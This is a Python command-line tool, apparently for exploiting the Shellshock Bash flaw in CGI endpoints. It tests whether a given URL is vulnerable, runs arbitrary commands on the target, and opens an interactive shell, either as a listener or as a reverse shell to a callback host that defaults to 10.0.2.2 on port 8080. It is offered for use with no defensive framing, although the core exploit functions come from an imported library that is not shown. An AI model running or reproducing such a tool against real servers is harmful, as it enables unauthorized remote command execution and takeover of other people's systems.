#!/usr/bin/env python3.4
# -*- coding: utf-8 -*-
import click
import functools

from libshellshock import is_vulnerable, get_shell, send_command, make_listener


def test_before(f):
    @functools.wraps(f)
    def __inner(ctx, *args, **kwargs):
        if not is_vulnerable(ctx.obj):
            click.echo("Error: URL is not vulnerable.")
            return 1
        f(ctx, *args, **kwargs)
    return click.pass_context(__inner)


@click.group()
@click.argument("cgi_url")
@click.version_option("0.1337")
@click.pass_context
def shellshock(ctx, cgi_url):
    ctx.obj = cgi_url


@shellshock.command()
@test_before
def test(ctx):
    click.echo("URL is vulnerable! :)")


@shellshock.command("exec")
@click.argument("command", default="echo 'This URL is vulnerable. :)'")
@click.option("--path", "-p", default="/usr/sbin:/usr/bin:/sbin:/bin",
              help="PATH environment variable for command execution")
@test_before
def execute(ctx, command, path):
    resp = send_command(ctx.obj, command, path)
    click.echo(resp)


@shellshock.command()
@click.option("--listen/--get", "-l/-g", default=True)
@click.option("--port", default=8080)
@click.option("--host", default="10.0.2.2")
@test_before
def shell(ctx, listen, port, host):
    if listen:
        return make_listener(ctx.obj, port)
    return get_shell(ctx.obj, host, port)


if __name__ == "__main__":
    shellshock()
